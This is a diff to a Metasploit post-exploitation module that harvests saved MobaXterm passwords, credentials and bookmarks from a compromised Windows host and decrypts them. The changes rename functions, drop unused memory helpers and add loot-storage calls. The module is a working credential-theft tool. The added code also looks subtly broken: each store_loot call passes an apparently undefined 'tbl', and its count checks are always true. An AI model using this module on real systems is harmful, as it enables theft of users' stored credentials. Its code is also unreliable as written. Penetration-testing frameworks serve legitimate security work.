@@ -14,7 +14,7 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'Windows Gather MobaXtrem Passwords',
+        'Name' => 'Windows Gather MobaXterm Passwords',
         'Description' => %q{
           This module will determine if MobaXterm is installed on the target system and, if it is, it will try to
           dump all saved session information from the target. The passwords for these saved sessions will then be decrypted
@@ -22,7 +22,7 @@ class MetasploitModule < Msf::Post
         },
         'License' => MSF_LICENSE,
         'References' => [
-          [ 'URL', 'https://blog.kali-team.cn/Metasploit-MobaXtrem-0b976b993c87401598be4caab8cbe0cd' ]
+          [ 'URL', 'https://blog.kali-team.cn/Metasploit-MobaXterm-0b976b993c87401598be4caab8cbe0cd' ]
         ],
         'Author' => ['Kali-Team <kali-team[at]qq.com>'],
         'Platform' => [ 'win' ],
@@ -51,50 +51,6 @@ class MetasploitModule < Msf::Post
         OptString.new('CONFIG_PATH', [ false, 'Specifies the config file path for MobaXterm']),
       ]
     )
-  end
-
-  def pack_add(data)
-    if is_86
-      addr = [data].pack('V')
-    else
-      addr = [data].pack('Q<')
-    end
-    return addr
-  end
-
-  def mem_write(data, length)
-    pid = session.sys.process.open.pid
-    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
-    mem = process.memory.allocate(length)
-    process.memory.write(mem, data)
-    return mem
-  end
-
-  def read_str(address, len, type)
-    begin
-      pid = session.sys.process.open.pid
-      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)
-      raw = process.memory.read(address, len)
-      case type
-      when 0 # unicode
-        str_data = raw.gsub("\x00", '')
-      when 1 # null terminated
-        str_data = raw.unpack1('Z*')
-      when 2 # raw data
-        str_data = raw
-      end
-    rescue StandardError
-      str_data = nil
-    end
-    return str_data || 'Error Decrypting'
-  end
-
-  #
-  # RAILGUN HELPER FUNCTIONS
-  #
-  def is_86
-    pid = session.sys.process.open.pid
-    return session.sys.process.each_process.find { |i| i['pid'] == pid } ['arch'] == 'x86'
   end
 
   def windows_unprotect(entropy, data)
@@ -223,7 +179,7 @@ class MetasploitModule < Msf::Post
     result
   end
 
-  def gather_creads(config)
+  def gather_creds(config)
     result = []
     if config['PasswordsInRegistry'] == '1'
       parent_key = "#{config['RegistryKey']}\\C"
@@ -278,7 +234,7 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def parser_bookmark(bookmarks)
+  def parse_bookmarks(bookmarks)
     result = []
     protocol_hash = { '#109#0' => 'ssh', '#98#1' => 'telnet', '#128#5' => 'vnc', '#140#7' => 'sftp', '#130#6' => 'ftp', '#100#2' => 'rsh', '#91#4' => 'rdp' }
     bookmarks.each_key do |key|
@@ -326,7 +282,7 @@ class MetasploitModule < Msf::Post
       pws_result.each do |item|
         pw_tbl << item.values
       end
-      creds_result = gather_creads(config)
+      creds_result = gather_creds(config)
       columns = [
         'CredentialsName',
         'Username',
@@ -339,7 +295,7 @@ class MetasploitModule < Msf::Post
       creds_result.each do |item|
         creds_tbl << item.values
       end
-      bookmarks_result = parser_bookmark(config['Bookmarks'])
+      bookmarks_result = parse_bookmarks(config['Bookmarks'])
       columns = [
         'BookmarksName',
         'Protocol',
@@ -354,8 +310,20 @@ class MetasploitModule < Msf::Post
       bookmarks_result.each do |item|
         bookmarks_tbl << item.values
       end
-      print_good(pw_tbl.to_s)
-      print_good(creds_tbl.to_s)
+      if pw_tbl.count
+        path = store_loot('host.moba_xterm', 'text/plain', session, tbl, 'moba_xterm.txt', 'MobaXterm Password')
+        print_good("Passwords stored in: #{path}")
+        print_good(pw_tbl.to_s)
+      end
+      if creds_tbl.count
+        path = store_loot('host.moba_xterm', 'text/plain', session, tbl, 'moba_xterm.txt', 'MobaXterm Credentials')
+        print_good("Credentials stored in: #{path}")
+        print_good(creds_tbl.to_s)
+      end
+      next unless bookmarks_tbl.count
+
+      path = store_loot('host.moba_xterm', 'text/plain', session, tbl, 'moba_xterm.txt', 'MobaXterm Bookmarks')
+      print_good("Bookmarks stored in: #{path}")
       print_good(bookmarks_tbl.to_s)
     end
   end
